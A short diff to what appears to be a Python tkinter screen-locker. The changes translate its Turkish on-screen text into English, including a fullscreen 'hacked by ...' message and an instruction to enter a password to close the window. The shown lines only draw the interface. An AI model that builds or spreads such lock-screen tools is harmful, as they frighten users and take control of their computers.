@@ -17,9 +17,9 @@ window.attributes("-fullscreen", True)
 entry = Entry(window,font= 1)
 entry.place(width=150,height=50,x=width/2-75,y=height/2-25)
 
-label0 = Label(window,text="sifreyi girip ctrl c basarsan kapanir")
+label0 = Label(window,text="enter the password and press ctrl c and it turns off")
 label0.place(x=width/2-75-130,y=height/2-25-100)
-label1 = Label(window,text="Pain tarafindan hacklendin")
+label1 = Label(window,text="hacked by ...")
 label1.grid(row=0,column=0)
 
 window.update()
